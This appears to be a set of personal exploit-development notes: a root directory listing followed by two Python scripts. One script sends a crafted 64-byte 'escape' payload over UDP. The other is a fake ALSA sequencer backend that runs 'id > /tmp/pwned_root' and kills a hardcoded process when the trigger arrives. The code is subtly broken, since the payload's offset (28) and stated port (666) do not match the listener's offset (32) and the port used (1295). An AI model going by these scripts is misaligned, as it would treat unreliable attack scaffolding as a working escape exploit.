# Python Scripts as Text

root@router:~/scripts# ls -alh -r
drwxr-xr-x 2 root root 4.0K Feb 25 10:49 zzzZZZ
-rw-r--r-- 1 root root  725 Feb 25 11:52 trigger_saas.py
-rw-r--r-- 1 root root  668 Feb 25 12:18 trace_tcp_2.py
-rw-r--r-- 1 root root 1.2K Feb 25 12:13 trace_tcp.py
-rw-r--r-- 1 root root 1.5K Feb 25 11:52 tcp-server.py
-rw-r--r-- 1 root root  409 Feb 25 12:52 force_refresh_baby.py
-rw-r--r-- 1 root root 1.1K Feb 25 11:17 fake_saas_details.md
-rw-r--r-- 1 root root 1.1K Feb 25 11:18 fake_saas.py


## trigger_saas.py

```python

## summary: byte sequence to trigger escape from saas service on 666

## v1.00 Start

import socket

# 1. Start with the Type (10)
# 2. Add 27 bytes of padding (to reach offset 28)
# 3. Add the Duration (0x79 == 121) as a 4-byte little-endian integer
# 4. Fill the rest to 64 bytes
payload = b"\x0a" + b"\x00"*27 + b"\x79\x00\x00\x00" + b"\x00"*32
print(f"payload:  {payload}")

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(payload, ("127.0.0.1", 1295))
print("Payload sent to ALSA port 1295...")

```

##  fake_saas.py 
```python 
import os
import struct

# The ALSA sequencer device
SEQ_DEV = "/dev/snd/seq"

def fake_alsa_backend():
    print("[*] Opening ALSA Sequencer...")
    fd = os.open(SEQ_DEV, os.O_RDWR)

    # We need to tell the kernel who we are
    # This is a simplified version of what libasound does
    print("[*] Waiting for MIDI events from rtpmidid (128:0)...")

    while True:
        # ALSA events are 64 bytes
        buf = os.read(fd, 64)
        if not buf:
            continue

        # Offset 0: Event Type
        # Offset 32: Duration (4-byte unsigned int)
        event_type = buf[0]
        duration = struct.unpack_from("<I", buf, 32)[0]

        print(f"[*] Event Type: {event_type} | Duration: {duration}")

        if duration == 121:
            print("[!!!] ESCAPE TRIGGERED [!!!]")
            os.system("id > /tmp/pwned_root")
            # Kill the baby to show we escaped
            os.system("kill -9 35978")
            break

if __name__ == "__main__":
    fake_alsa_backend()

```